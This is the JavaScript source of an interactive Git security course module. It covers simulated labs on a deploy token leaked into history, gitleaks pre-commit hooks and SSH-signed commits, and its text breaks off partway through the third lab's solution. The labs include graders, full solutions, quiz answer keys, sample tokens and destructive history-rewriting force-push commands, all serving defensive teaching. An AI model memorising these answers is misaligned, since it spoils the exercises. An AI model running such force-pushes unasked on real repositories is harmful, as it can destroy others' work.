/* sudo learn — Git & GitHub track, Module 4: Git security & DevSecOps (GT-128..136). Secrets in history (filter-repo),
   pre-commit hooks with gitleaks, SSH-signed commits, GitHub's security features (secret scanning, push protection,
   Dependabot, CodeQL), hardening GitHub Actions, the software supply chain (SBOMs, dependency review, OIDC),
   access control and the audit log, a leaked-credential incident, and a capstone. Engine: gitsec.js. */
(function () {
  "use strict";
  var S = window.ShEngine, G = window.GitCore, GL = window.GitLab, GH = window.GitHub, A = window.GitActions, SEC = window.GitSec, T = window.GIT_TRACK, M2 = T.M2, M3 = T.M3;
  var ex = T.ex, code = T.code, lines = T.lines, sol = M3.sol;
  var MAYA = "Maya Chen · SRE lead", DEV = "Dev Patel · Security", BEN = "Ben Okoro · Developer";
  var HOME = "/home/dev";
  var LABS = [];

  /* ---------------- helpers */
  function repo(r, name) { return GL.H.repo(r, name); }
  function ran(r, re, fn) { return r.history.some(function (e) { return re.test(e.cmd) && (!fn || fn(e)); }); }
  function all(e) { return e.out.concat(e.err); }
  function outHas(e, re) { return all(e).some(function (l) { return re.test(l); }); }
  function anyOut(r, re) { return r.history.some(function (e) { return outHas(e, re); }); }
  function gh(r, full) { return GH.find(r.sys, full); }
  function tip(r, full, b) { var x = gh(r, full); return x ? x.refs["refs/heads/" + b] || null : null; }
  function fileOn(r, full, b, p) { var s = tip(r, full, b); if (!s) return null; var f = G.commitFlat(r.sys, s)[p]; return f ? G.blobText(r.sys, f.sha) : null; }
  function modeOn(r, full, b, p) { var s = tip(r, full, b); if (!s) return null; var f = G.commitFlat(r.sys, s)[p]; return f ? f.mode : null; }
  function prs(r, full) { var x = gh(r, full); return x ? x.items.filter(function (i) { return i.type === "pr"; }) : []; }
  function runs(r, full, f) { return M3.runs(r, full, f); }
  function logOf(j) { return M3.logOf(j); }
  function wfsOn(r, full, ref) { return M3.wfsOn(r, full, ref); }
  function jobsOf(w) { return w && w.doc && w.doc.jobs && typeof w.doc.jobs === "object" ? w.doc.jobs : {}; }
  function steps(job) { return job && Array.isArray(job.steps) ? job.steps : []; }
  function cfgLocal(v, k) { return v ? G.configGet(v.sys, v.repo, 1000, k) : null; }
  function cfgGlobal(r, k) { return G.configGet(r.sys, null, 1000, k); }
  // every commit reachable from any of a GitHub repository's refs
  function reachable(r, full) { var x = gh(r, full), out = {}; Object.keys(x.refs).forEach(function (k) { var s = G.peel(r.sys, x.refs[k]); if (G.commitOf(r.sys, s)) G.ancestors(r.sys, s, out); }); return Object.keys(out); }
  function historyHas(r, full, needle) { return reachable(r, full).some(function (s) { var f = G.commitFlat(r.sys, s); return Object.keys(f).some(function (p) { return String(G.blobText(r.sys, f[p].sha)).indexOf(needle) >= 0; }); }); }
  function historyPath(r, full, path) { return reachable(r, full).some(function (s) { return !!G.commitFlat(r.sys, s)[path]; }); }
  function world(sys, o) { M2.world(sys, o); }
  function sshKey(sys) {
    GH.runAs(sys, HOME, ["ssh-keygen -q -t ed25519 -C dev@kestrel.io -f ~/.ssh/id_ed25519 -N ''"]);
    var pub = G.readText(sys, HOME + "/.ssh/id_ed25519.pub").trim().split(/\s+/);
    GH.hub(sys).users["kc-dev"].keys.push({ title: "kc-dev-01", blob: pub[1], type: pub[0], added: G.clock(sys) - 86400 * 20 });
    return pub[1];
  }
  T.M4 = { reachable: reachable, historyHas: historyHas, sshKey: sshKey };

  /* ---------------- the Kestrel API (Python) */
  var API_FILES = {
    "README.md": "# kestrel-api\n\nThe Kestrel Cloud API (Flask).\n\n    pip install -r requirements.txt\n    flask --app app.main run\n",
    "requirements.txt": "flask==3.0.3\ngunicorn==22.0.0\n",
    ".gitignore": "__pycache__/\n*.pyc\n",
    "app/__init__.py": "",
    "app/main.py": "from flask import Flask\n\napp = Flask(__name__)\n\n\n@app.get(\"/\")\ndef index():\n    return {\"service\": \"kestrel-api\"}\n",
    "tests/test_main.py": "from app.main import app\n\n\ndef test_index():\n    assert app.test_client().get(\"/\").status_code == 200\n"
  };
  T.M4.API_FILES = API_FILES;
  function apiSteps(extra) {
    return [{ msg: "Initial API", by: "ben", at: "2026-09-28 10:00", files: API_FILES }].concat(extra || [], [
      { msg: "Add health check", by: "maya", at: "2026-10-05 10:00", files: { "app/health.py": "def health():\n    return {\"status\": \"ok\"}\n" } },
      { msg: "Add search endpoint", by: "ana", at: "2026-10-09 15:00", files: { "app/search.py": "def search(db, q):\n    return db.execute(\"SELECT id, name FROM items WHERE name = ?\", (q,)).fetchall()\n" } }
    ]);
  }

  /* ================================================================== GT-128 A secret in history */
  function leakWorld(sys) {
    world(sys);
    var tok = A.deployToken(sys, "kestrel-api", "staging");
    sys.lab = { tok: tok };
    GH.seed(sys, "kestrel/kestrel-api", { steps: [
      { msg: "Initial API", by: "ben", at: "2026-09-28 10:00", files: API_FILES },
      { msg: "Add local settings for the staging deploy", by: "ben", at: "2026-10-03 10:00", files: { ".env": "# local settings\nDATABASE_URL=postgres://app:app@localhost:5432/kestrel\nKESTREL_DEPLOY_TOKEN=" + tok + "\n" } },
      { msg: "Remove .env (oops)", by: "ben", at: "2026-10-03 10:20", files: { ".env": null } },
      { tag: "v0.9.0", msg: "kestrel-api 0.9.0", by: "maya", at: "2026-10-04 09:00" },
      { branch: "feature/rate-limit" },
      { msg: "Rate limiting: first draft", by: "ana", at: "2026-10-06 11:00", files: { "app/ratelimit.py": "LIMIT = 100  # requests per minute\n" } },
      { checkout: "main" },
      { msg: "Add health check", by: "maya", at: "2026-10-05 10:00", files: { "app/health.py": "def health():\n    return {\"status\": \"ok\"}\n" } },
      { msg: "Add search endpoint", by: "ana", at: "2026-10-09 15:00", files: { "app/search.py": "def search(db, q):\n    return db.execute(\"SELECT id, name FROM items WHERE name = ?\", (q,)).fetchall()\n" } }
    ] }, { private: true, description: "The Kestrel Cloud API" });
    var r = GH.find(sys, "kestrel/kestrel-api");
    r.collab["kc-dev"] = "admin";
    sys.lab.mainTree = G.commitOf(sys, r.refs["refs/heads/main"]).tree;
    sys.lab.leakCommit = (function () { var s = r.refs["refs/tags/v0.9.0"]; s = G.peel(sys, s); while (s) { var co = G.commitOf(sys, s); if (/^Add local settings/.test(co.message)) return s; s = co.parents[0]; } return null; })();
    GH.cloneTo(sys, "kestrel/kestrel-api", HOME + "/kestrel-api");
  }
  LABS.push({
    id: "gt-128", n: 28, module: 4, ticket: "GT-128", xp: 200,
    title: "A secret in history",
    topic: "rotate, filter-repo, force-push",
    from: DEV,
    story: "<p>Our new scanner flagged <code>kestrel/kestrel-api</code>: a month ago Ben committed a <code>.env</code> file with the <b>staging deploy token</b> in it, then deleted it in the next commit. \"It's gone, right?\" It isn't: every clone has it in history. Handle it properly: find it, kill the token, then remove the file from every commit on GitHub, branches and tags included. I've lifted <code>main</code>'s protection for the cleanup. Your clone is in <code>~/kestrel-api</code>.</p>",
    learn:
      "<h3>Deleting a file doesn't delete its history</h3><p>A commit that removes <code>.env</code> only means \"from here on, no <code>.env</code>\". Every earlier commit still has it, and anyone with a clone can read it:</p>" +
      code("git log --all --oneline -- .env           # commits that touched it\ngit show COMMIT:.env                       # the file as it was in COMMIT\ngit log -p --all -S KESTREL_DEPLOY_TOKEN    # commits that added or removed that text") +
      "<h3>Step 1: revoke it. Before anything else.</h3><p>Once a secret has been pushed, assume it's been copied: bots scrape GitHub for credentials within minutes. Cleaning history comes second; <b>rotating</b> (revoking the old secret, issuing a new one) is what actually protects you. Kestrel's deploy service lets a token revoke itself:</p>" +
      code("curl -fsS -X DELETE -H \"Authorization: Bearer TOKEN\" https://deploy.kestrel.io/api/tokens/self") +
      "<h3>Step 2: rewrite history with git filter-repo</h3><p><code>git filter-repo</code> (a separate tool: <code>sudo apt install git-filter-repo</code>) rewrites every commit. It's destructive, so it insists on a <b>fresh clone</b>:</p>" +
      code("cd ~ && git clone https://github.com/kestrel/kestrel-api.git kestrel-api-clean\ncd kestrel-api-clean\ngit filter-repo --invert-paths --path .env      # drop .env from every commit\ngit log --all --oneline -- .env                  # nothing any more") +
      "<p><code>--path X</code> selects files, <code>--invert-paths</code> means \"everything except\". <code>--replace-text FILE</code> instead replaces strings (one per line) with <code>***REMOVED***</code>, for secrets inside files you want to keep. Commits that become empty disappear, and every commit after the change gets a new ID.</p>" +
      "<h3>Step 3: replace what's on GitHub</h3><p>filter-repo removes the <code>origin</code> remote on purpose (so you don't push by accident). Add it back and force-push <b>every branch and every tag</b>:</p>" +
      code("git remote add origin https://github.com/kestrel/kestrel-api.git\ngit push --force --all origin\ngit push --force --tags origin") +
      "<p>Afterwards: everyone must re-clone (old clones still have the secret and would push it back), and GitHub may keep the old commits reachable through pull request refs and caches until GitHub Support purges them. That's why rotation is step 1. Finally, make sure it can't happen again: add <code>.env</code> to <code>.gitignore</code>.</p>",
    system: leakWorld,
    starter: "",
    objectives: [
      {
        id: "find", text: "In <code>~/kestrel-api</code>, find the commit that added <code>.env</code> and show the token it leaked.",
        hints: ["git log --all --oneline -- .env lists the commits that touched it; git show COMMIT:.env prints the file from that commit.", "cd ~/kestrel-api\ngit log --all --oneline -- .env\ngit show COMMIT:.env"],
        check: function (r) {
          var lab = r.sys.lab, c7 = lab.leakCommit.slice(0, 7);
          var sawCommit = r.history.some(function (e) { return /^(git|gitleaks)\b/.test(e.cmd) && all(e).some(function (l) { return l.indexOf(c7) >= 0; }); });
          if (!sawCommit) return "Find the commit first: git log --all --oneline -- .env";
          return anyOut(r, new RegExp(lab.tok)) ? true : "Now print the leaked token: git show COMMIT:.env";
        }
      },
      {
        id: "revoke", text: "Revoke the leaked token with Kestrel's deploy service, before touching history.",
        hints: ["curl with -X DELETE to https://deploy.kestrel.io/api/tokens/self, sending the token in an Authorization: Bearer header.", "curl -fsS -X DELETE -H \"Authorization: Bearer TOKEN\" https://deploy.kestrel.io/api/tokens/self"],
        check: function (r) { var t = A.svc(r.sys).tokens[r.sys.lab.tok]; return t && t.revoked ? true : "The token still works. Revoke it: curl -X DELETE -H 'Authorization: Bearer TOKEN' https://deploy.kestrel.io/api/tokens/self"; }
      },
      {
        id: "rewrite", text: "Remove <code>.env</code> from every commit on GitHub (all branches and tags, nothing else lost), and make <code>main</code> ignore <code>.env</code> files from now on.",
        hints: ["sudo apt install git-filter-repo; work in a fresh clone; git filter-repo --invert-paths --path .env; add origin back; push --force --all and --tags. Then .gitignore.", "sudo apt install -y git-filter-repo\ncd ~ && git clone https://github.com/kestrel/kestrel-api.git kestrel-api-clean && cd kestrel-api-clean\ngit filter-repo --invert-paths --path .env\ngit remote add origin https://github.com/kestrel/kestrel-api.git\ngit push --force --all origin\ngit push --force --tags origin\necho .env >> .gitignore && git commit -am 'Ignore .env files' && git push origin main"],
        check: function (r) {
          var x = gh(r, "kestrel/kestrel-api"), lab = r.sys.lab;
          if (historyPath(r, "kestrel/kestrel-api", ".env") || historyHas(r, "kestrel/kestrel-api", lab.tok)) return "Some branch or tag on GitHub still reaches a commit with .env (check git ls-remote: main, feature/rate-limit and the tag v0.9.0).";
          ["refs/heads/main", "refs/heads/feature/rate-limit", "refs/tags/v0.9.0"].forEach(function (k) { if (!x.refs[k]) lab.missing = k; });
          if (!x.refs["refs/heads/main"] || !x.refs["refs/heads/feature/rate-limit"] || !x.refs["refs/tags/v0.9.0"]) return "Don't lose anything: main, feature/rate-limit and v0.9.0 must all still be on GitHub.";
          var fr = G.commitFlat(r.sys, x.refs["refs/heads/feature/rate-limit"]);
          if (!fr["app/ratelimit.py"]) return "feature/rate-limit lost its work (app/ratelimit.py).";
          var m = G.commitFlat(r.sys, x.refs["refs/heads/main"]), want = G.flatTree(r.sys, lab.mainTree);
          var lost = Object.keys(want).filter(function (p) { return !m[p]; });
          if (lost.length) return "main lost files: " + lost.join(", ");
          var gi = m[".gitignore"] ? G.blobText(r.sys, m[".gitignore"].sha) : "";
          return /^\/?\.env$/m.test(gi) ? true : "Last step: add .env to .gitignore on main, so it can't be committed again.";
        }
      }
    ],
    solution: sol("cd ~/kestrel-api", "git log --all --oneline -- .env", "git show $(git log --all --format=%h -- .env | tail -1):.env",
      "curl -fsS -X DELETE -H \"Authorization: Bearer $(git show $(git log --all --format=%h -- .env | tail -1):.env | grep KESTREL_DEPLOY_TOKEN | cut -d= -f2)\" https://deploy.kestrel.io/api/tokens/self",
      "sudo apt install -y git-filter-repo", "cd ~", "git clone https://github.com/kestrel/kestrel-api.git kestrel-api-clean", "cd kestrel-api-clean",
      "git filter-repo --invert-paths --path .env", "git log --all --oneline -- .env", "git remote add origin https://github.com/kestrel/kestrel-api.git",
      "git push --force --all origin", "git push --force --tags origin", "echo .env >> .gitignore", "git commit -am 'Ignore .env files'", "git push origin main"),
    debrief: "<p>The order was the point: the token was dead before you touched history, so even someone who copied it last month can't use it. Then the history rewrite made sure no clone made from now on carries it, across every branch and tag.</p><p>What you can't fix from your laptop: old clones, forks, and GitHub's cached pull request refs. That's why teams treat <i>any</i> pushed secret as compromised. Next: stop secrets before they're ever committed.</p>",
    realworld: "GitHub's guide \"Removing sensitive data from a repository\" walks through the same steps (and how to ask GitHub Support to purge cached views). git filter-repo --analyze shows what's taking space in a repository's history.",
    quiz: [
      { q: "A secret was pushed an hour ago. What's the first thing to do?", options: ["Rewrite history with filter-repo", "Revoke (rotate) the secret", "Make the repository private", "Delete the file in a new commit"], answer: 1, why: "Assume it's already copied. Only revoking it makes it useless; cleaning history comes after." },
      { q: "Why does git filter-repo want a fresh clone?", options: ["It's faster", "It rewrites every commit, so it refuses to risk your only copy and its unpushed work", "Fresh clones have no secrets", "It can't read old clones"], answer: 1, why: "A fresh clone is disposable: if anything goes wrong, nothing unique is lost." },
      { q: "After the force-push, what about teammates' existing clones?", options: ["They update automatically", "They still contain the old history and must re-clone (or hard-reset) instead of merging", "git pull fixes them", "Nothing changes for them"], answer: 1, why: "Their copies still have the old commits; a merge would bring the secret straight back." }
    ]
  });

  /* ================================================================== GT-129 Hooks: pre-commit and gitleaks */
  var FIXTURE = "# Settings used by the test suite. Not real credentials.\nAPI_KEY = \"test_9f8e7d6c5b4a3e2d1c0b9a8f\"\nDEBUG = True\n";
  var HOOK = "#!/bin/bash\n# Shared pre-commit hook: block commits that contain secrets.\ngitleaks protect --staged --redact -v --no-banner\n";
  T.M4.HOOK = HOOK;
  function hookWorld(sys) {
    world(sys);
    GH.seed(sys, "kestrel/kestrel-api", { steps: apiSteps([{ msg: "Add test settings", by: "ben", at: "2026-10-02 10:00", files: { "tests/fixtures/settings.py": FIXTURE } }]) }, { private: true, description: "The Kestrel Cloud API" });
    GH.find(sys, "kestrel/kestrel-api").collab["kc-dev"] = "admin";
    GH.cloneTo(sys, "kestrel/kestrel-api", HOME + "/kestrel-api");
    var pat = GH.newToken(sys, "kc-dev", { scopes: ["repo"], note: "release notifier" });
    sys.lab = { pat: pat };
    G.putFile(sys, HOME + "/snippets/notify.sh", "#!/bin/bash\n# Tell GitHub a release went out (from Ben's laptop)\ncurl -fsS -X POST \\\n  -H \"Authorization: Bearer " + pat + "\" \\\n  https://api.github.com/repos/kestrel/kestrel-api/dispatches \\\n  -d '{\"event_type\":\"released\"}'\n", 436, 1000, 1000);
    var r = GH.find(sys, "kestrel/kestrel-api"), s = r.refs["refs/heads/main"];
    while (s) { var co = G.commitOf(sys, s); if (/^Add test settings/.test(co.message)) { sys.lab.fp = s + ":tests/fixtures/settings.py:generic-api-key:2"; break; } s = co.parents[0]; }
  }
  var NOTIFY_FIXED = "#!/bin/bash\n# Tell GitHub a release went out. Needs GITHUB_TOKEN in the environment.\n: \"${GITHUB_TOKEN:?set GITHUB_TOKEN first}\"\ncurl -fsS -X POST \\\n  -H \"Authorization: Bearer $GITHUB_TOKEN\" \\\n  https://api.github.com/repos/kestrel/kestrel-api/dispatches \\\n  -d '{\"event_type\":\"released\"}'\n";
  LABS.push({
    id: "gt-129", n: 29, module: 4, ticket: "GT-129", xp: 200,
    title: "Hooks",
    topic: "pre-commit hooks and gitleaks",
    from: DEV,
    story: "<p>After last week, I want secrets caught <b>before</b> they're committed. Set up <code>gitleaks</code> for <code>kestrel/kestrel-api</code> (cloned in <code>~/kestrel-api</code>): scan the existing history, and give the team a pre-commit hook that lives in the repository, so everyone gets the same one. Then prove it works with Ben's release script in <code>~/snippets/notify.sh</code>, which has his GitHub token pasted right in it.</p>",
    learn:
      "<h3>gitleaks</h3><p>A scanner that knows what secrets look like (GitHub tokens, cloud keys, private keys, anything assigned to <code>password</code> or <code>api_key</code> that looks random). On Ubuntu: <code>sudo apt install gitleaks</code>.</p>" +
      code("gitleaks detect -v            # every commit in the repository\ngitleaks protect --staged -v  # only what you're about to commit\n--redact                      # don't print the secrets themselves") +
      "<p>Each finding has a <b>Fingerprint</b> (<code>COMMIT:FILE:RULE:LINE</code>). A finding that isn't a real secret, like a fake key in test fixtures, is a <b>false positive</b>: put its fingerprint in a <code>.gitleaksignore</code> file at the top of the repository, and commit that. gitleaks exits with status 1 when it finds leaks, 0 when it doesn't.</p>" +
      "<h3>Git hooks</h3><p>A hook is a script Git runs at certain moments. <code>pre-commit</code> runs before each commit; if it exits non-zero, the commit doesn't happen. Hooks normally live in <code>.git/hooks/</code>, which isn't part of the repository, so they can't be shared. Instead, keep them in a folder in the repository and point Git at it:</p>" +
      code("mkdir .githooks\nnano .githooks/pre-commit          # #!/bin/bash + the check\nchmod +x .githooks/pre-commit       # hooks must be executable\ngit config core.hooksPath .githooks # each person runs this once") +
      "<p>The popular <b>pre-commit</b> framework (pre-commit.com) does the same with a <code>.pre-commit-config.yaml</code> and a library of ready-made hooks.</p>" +
      "<h3>Hooks are a seatbelt, not a lock</h3><p>Anyone can skip them (<code>git commit --no-verify</code>) or never install them. So scan in CI too, and turn on GitHub's push protection (next labs). Hooks are for catching honest mistakes early, on the laptop, where they're cheapest to fix.</p>",
    system: hookWorld,
    starter: "",
    objectives: [
      {
        id: "baseline", text: "Install gitleaks and scan the repository's history. Its only finding is a fake key in the test fixtures: mark that one as a false positive in <code>.gitleaksignore</code>, push it to <code>main</code>, and show a scan that comes back clean.",
        hints: ["sudo apt install gitleaks; gitleaks detect -v prints a Fingerprint line. Put exactly that line in .gitleaksignore, commit, push, scan again.", "sudo apt install -y gitleaks\ncd ~/kestrel-api\ngitleaks detect -v\ngitleaks detect -v 2>/dev/null | grep Fingerprint | cut -d' ' -f2 > .gitleaksignore\ngit add .gitleaksignore && git commit -m 'Ignore the test fixture key in gitleaks' && git push\ngitleaks detect"],
        check: function (r) {
          var ig = fileOn(r, "kestrel/kestrel-api", "main", ".gitleaksignore");
          if (ig === null) return "main has no .gitleaksignore yet.";
          if (ig.split("\n").map(function (l) { return l.trim(); }).indexOf(r.sys.lab.fp) < 0) return ".gitleaksignore should contain the finding's Fingerprint line, exactly as gitleaks printed it.";
          return ran(r, /gitleaks\s+detect/, function (e) { return e.exit === 0 && outHas(e, /no leaks found/); }) ? true : "Run gitleaks detect again: it should say no leaks found.";
        }
      },
      {
        id: "hook", text: "Commit a shared pre-commit hook, <code>.githooks/pre-commit</code> (executable), that runs <code>gitleaks protect --staged</code>, push it, and switch your clone to use <code>.githooks</code>.",
        hints: ["mkdir .githooks; nano .githooks/pre-commit; chmod +x it; git add, commit, push; git config core.hooksPath .githooks", "mkdir -p .githooks\nnano .githooks/pre-commit\n    #!/bin/bash\n    gitleaks protect --staged --redact -v --no-banner\nchmod +x .githooks/pre-commit\ngit add .githooks && git commit -m 'Add a shared pre-commit hook that runs gitleaks' && git push\ngit config core.hooksPath .githooks"],
        check: function (r) {
          var t = fileOn(r, "kestrel/kestrel-api", "main", ".githooks/pre-commit");
          if (t === null) return "main has no .githooks/pre-commit yet.";
          if (!/gitleaks\s+protect\b[^\n]*--staged/.test(t)) return "The hook should run gitleaks protect --staged.";
          if (modeOn(r, "kestrel/kestrel-api", "main", ".githooks/pre-commit") !== "100755") return "The hook isn't executable in the repository: chmod +x it and commit again (or git update-index --chmod=+x).";
          var v = repo(r, "kestrel-api");
          return v && cfgLocal(v, "core.hooksPath") === ".githooks" ? true : "Point your clone at the shared hooks: git config core.hooksPath .githooks";
        }
      },
      {
        id: "proof", text: "Add Ben's script to the repository as <code>scripts/notify.sh</code>. First try it as it is (the hook must stop the commit), then make it read the token from the <code>GITHUB_TOKEN</code> environment variable instead, and get it onto <code>main</code>.",
        hints: ["cp ~/snippets/notify.sh scripts/, git add, git commit: the hook blocks it. Edit the file so the header uses $GITHUB_TOKEN, add it again, commit, push.", "mkdir -p scripts && cp ~/snippets/notify.sh scripts/\ngit add scripts/notify.sh && git commit -m 'Add release notifier'   # blocked\nnano scripts/notify.sh    # Authorization: Bearer $GITHUB_TOKEN\ngit add scripts/notify.sh && git commit -m 'Add release notifier' && git push"],
        check: function (r) {
          var pat = r.sys.lab.pat;
          var blocked = r.history.some(function (e) { return /git\s+commit\b/.test(e.cmd) && !/--no-verify|\s-n\b/.test(e.cmd) && e.exit !== 0 && outHas(e, /leaks found/); });
          if (!blocked) return "First let the hook block the original script: git add scripts/notify.sh, then git commit.";
          if (historyHas(r, "kestrel/kestrel-api", pat)) return "The token reached GitHub. (Never --no-verify past the hook.)";
          var v = repo(r, "kestrel-api"); if (v && v.log("HEAD", true).some(function (c) { var f = G.commitFlat(r.sys, c.sha); return Object.keys(f).some(function (p) { return String(G.blobText(r.sys, f[p].sha)).indexOf(pat) >= 0; }); })) return "A local commit contains the token: the hook should have stopped it.";
          var t = fileOn(r, "kestrel/kestrel-api", "main", "scripts/notify.sh");
          if (t === null) return "main has no scripts/notify.sh yet.";
          return /\$\{?GITHUB_TOKEN/.test(t) ? true : "scripts/notify.sh should use $GITHUB_TOKEN for the Authorization header.";
        }
      }
    ],
    solution: sol("sudo apt install -y gitleaks", "cd ~/kestrel-api", "gitleaks detect -v", "gitleaks detect -v 2>/dev/null | grep Fingerprint | cut -d' ' -f2 > .gitleaksignore", "cat .gitleaksignore",
      "git add .gitleaksignore", "git commit -m 'Ignore the test fixture key in gitleaks'", "git push", "gitleaks detect",
      "mkdir -p .githooks", { nano: ".githooks/pre-commit", text: HOOK }, "chmod +x .githooks/pre-commit", "git add .githooks", "git commit -m 'Add a shared pre-commit hook that runs gitleaks'", "git push", "git config core.hooksPath .githooks",
      "mkdir -p scripts", "cp ~/snippets/notify.sh scripts/", "git add scripts/notify.sh", "git commit -m 'Add release notifier'",
      { nano: "scripts/notify.sh", text: NOTIFY_FIXED }, "git add scripts/notify.sh", "git commit -m 'Add release notifier'", "git push"),
    debrief: "<p>The hook did its job: the commit with Ben's token never happened, so there was nothing to clean up. That's the cheapest possible place to catch a secret. And because the hook lives in the repository with <code>core.hooksPath</code>, every teammate runs the same check after one config command.</p><p>The baseline matters too: a scanner that always complains about the same fake test key gets ignored. One reviewed line in <code>.gitleaksignore</code> keeps the signal clean. Ben should still revoke that token (it was on his laptop in plain text). Next: proving who wrote a commit.</p>",
    realworld: "Try gitleaks detect -v on a repository of your own; most people are surprised at least once. For many hooks at once, look at the pre-commit framework (pre-commit.com), which has gitleaks, ShellCheck and dozens more as ready-made hooks.",
    quiz: [
      { q: "Why keep hooks in .githooks/ with core.hooksPath instead of .git/hooks/?", options: ["It's faster", ".git/hooks isn't committed, so it can't be shared; a tracked folder can", "Git ignores .git/hooks", "It's required for gitleaks"], answer: 1, why: "Files in .git/ aren't part of the repository. A tracked folder travels with every clone." },
      { q: "Can a pre-commit hook guarantee no secret is ever pushed?", options: ["Yes", "No: it can be skipped (--no-verify) or not installed, so also scan in CI and use push protection", "Only on Linux", "Only with --redact"], answer: 1, why: "Hooks run on the developer's machine, under the developer's control. They're a first line, not the only one." },
      { q: "gitleaks flags a fake key in test fixtures. Best response?", options: ["Delete the test", "Add its fingerprint to .gitleaksignore (reviewed and committed)", "Turn gitleaks off", "Rename the variable"], answer: 1, why: "Record the false positive precisely, so real findings still stand out." }
    ]
  });

  /* ================================================================== GT-130 Signed commits */
  function signWorld(sys) {
    world(sys);
    GH.seed(sys, "kestrel/kestrel-api", { steps: apiSteps() }, { private: true, description: "The Kestrel Cloud API" });
    var r = GH.find(sys, "kestrel/kestrel-api");
    r.collab["kc-dev"] = "admin";
    r.protect.main = { pr: null, checks: null, enforceAdmins: false, linear: false, forcePush: false, deletions: false, signatures: false };
    sys.lab = { blob: sshKey(sys) };
    GH.cloneTo(sys, "kestrel/kestrel-api", HOME + "/kestrel-api");
  }
  function signedBy(r, sha, blob) { var co = G.commitOf(r.sys, sha); if (!co || !co.gpgsig) return false; var d = window.GitSign.dearmor(co.gpgsig); return !!d && d.k === blob; }
  LABS.push({
    id: "gt-130", n: 30, module: 4, ticket: "GT-130", xp: 200,
    title: "Signed commits",
    topic: "SSH signing, Verified, required signatures",
    from: DEV,
    story: "<p>Anyone can run <code>git config user.email maya@kestrel.io</code> and commit as Maya. The name on a commit is just text. For <code>kestrel/kestrel-api</code>, we want proof: every commit on <code>main</code> signed by its author's key, shown as <b>Verified</b> on GitHub, and GitHub refusing anything else. You already have an SSH key (<code>~/.ssh/id_ed25519</code>) for pushing; Git can sign with it too. Your clone is in <code>~/kestrel-api</code>; you're an admin.</p>",
    learn:
      "<h3>Signing with your SSH key</h3>" + code("git config --global gpg.format ssh\ngit config --global user.signingkey ~/.ssh/id_ed25519.pub\ngit config --global commit.gpgsign true      # sign every commit (git commit -S does one)") +
      "<p>Git puts the signature inside the commit (<code>git cat-file -p HEAD</code> shows a <code>gpgsig</code> header). Changing anything in the commit, or rewriting it, breaks the signature. GPG keys work too (the default <code>gpg.format</code>), but SSH keys are simpler: you already have one.</p>" +
      "<h3>Checking signatures on your laptop</h3><p>Git needs a list of whose key is whose, the <b>allowed signers</b> file: one line per person, <code>EMAIL namespaces=\"git\" KEYTYPE KEY</code>.</p>" +
      code("echo 'dev@kestrel.io namespaces=\"git\"' \"$(cat ~/.ssh/id_ed25519.pub)\" > ~/.ssh/allowed_signers\ngit config --global gpg.ssh.allowedSignersFile ~/.ssh/allowed_signers\ngit log --show-signature -1\ngit verify-commit HEAD") +
      "<h3>Verified on GitHub</h3><p>GitHub marks a commit <b>Verified</b> when it's signed with a key you added to your account <b>as a signing key</b> (a separate list from the keys you push with), and the committer email is one of your account's emails.</p>" +
      code("gh ssh-key add ~/.ssh/id_ed25519.pub --type signing --title 'laptop signing'\ngh api repos/OWNER/REPO/commits/SHA --jq .commit.verification") +
      "<p><code>reason</code> says why not, when it isn't: <code>unsigned</code>, <code>unknown_key</code> (key not on any account), <code>bad_email</code> (committer email not on that account). Commits GitHub makes itself (merge buttons) are signed by GitHub.</p>" +
      "<h3>Requiring it</h3><p>Branch protection can refuse unsigned or unverified commits:</p>" + code("gh api -X POST repos/OWNER/REPO/branches/main/protection/required_signatures"),
    system: signWorld,
    starter: "",
    objectives: [
      {
        id: "sign", text: "Set Git up to sign every commit with your SSH key, then push a signed commit to <code>main</code> (any small change).",
        hints: ["Three git config --global settings: gpg.format ssh, user.signingkey ~/.ssh/id_ed25519.pub, commit.gpgsign true. Then commit and push.", "git config --global gpg.format ssh\ngit config --global user.signingkey ~/.ssh/id_ed25519.pub\ngit config --global commit.gpgsign true\necho 'Commits on main are signed.' >> README.md\ngit commit -am 'docs: note that commits are signed'\ngit push"],
        check: function (r) {
          if (cfgGlobal(r, "gpg.format") !== "ssh") return "git config --global gpg.format ssh";
          if (!/true|yes|on|1/i.test(cfgGlobal(r, "commit.gpgsign") || "")) return "Sign every commit: git config --global commit.gpgsign true";
          var t = tip(r, "kestrel/kestrel-api", "main");
          return signedBy(r, t, r.sys.lab.blob) ? true : "The newest commit on GitHub's main isn't signed with your key yet: commit something and push.";
        }
      },
      {
        id: "local", text: "Make Git able to check signatures on your laptop: an allowed-signers file that lists your key for <code>dev@kestrel.io</code>, and a check of your commit that says <b>Good</b> signature for <code>dev@kestrel.io</code>.",
        hints: ["~/.ssh/allowed_signers gets one line: dev@kestrel.io namespaces=\"git\" followed by your public key. Then git config --global gpg.ssh.allowedSignersFile, and git log --show-signature -1.", "echo 'dev@kestrel.io namespaces=\"git\"' \"$(cat ~/.ssh/id_ed25519.pub)\" > ~/.ssh/allowed_signers\ngit config --global gpg.ssh.allowedSignersFile ~/.ssh/allowed_signers\ngit verify-commit HEAD"],
        check: function (r) { return ran(r, /git\s+(log|show|verify-commit)\b/, function (e) { return outHas(e, /^Good "git" signature for dev@kestrel\.io with ED25519 key/); }) ? true : "git log --show-signature -1 (or git verify-commit HEAD) should print: Good \"git\" signature for dev@kestrel.io"; }
      },
      {
        id: "github", text: "Get your commit <b>Verified</b> on GitHub, then make <code>main</code> require signed commits.",
        hints: ["gh ssh-key add ~/.ssh/id_ed25519.pub --type signing. Check with gh api .../commits/SHA --jq .commit.verification. Then POST .../branches/main/protection/required_signatures.", "gh ssh-key add ~/.ssh/id_ed25519.pub --type signing --title 'kc-dev-01 signing'\ngh api repos/kestrel/kestrel-api/commits/$(git rev-parse HEAD) --jq .commit.verification\ngh api -X POST repos/kestrel/kestrel-api/branches/main/protection/required_signatures"],
        check: function (r) {
          var u = GH.hub(r.sys).users["kc-dev"];
          if (!u.signing.some(function (k) { return k.blob === r.sys.lab.blob; })) return "GitHub doesn't know your key as a signing key yet: gh ssh-key add ~/.ssh/id_ed25519.pub --type signing";
          var v = GH.verify(r.sys, tip(r, "kestrel/kestrel-api", "main"));
          if (!v.verified) return "main's newest commit isn't Verified (" + v.reason + ").";
          return gh(r, "kestrel/kestrel-api").protect.main.signatures ? true : "Turn on required signatures: gh api -X POST repos/kestrel/kestrel-api/branches/main/protection/required_signatures";
        }
      }
    ],
    solution: sol("cd ~/kestrel-api", "git config --global gpg.format ssh", "git config --global user.signingkey ~/.ssh/id_ed25519.pub", "git config --global commit.gpgsign true",
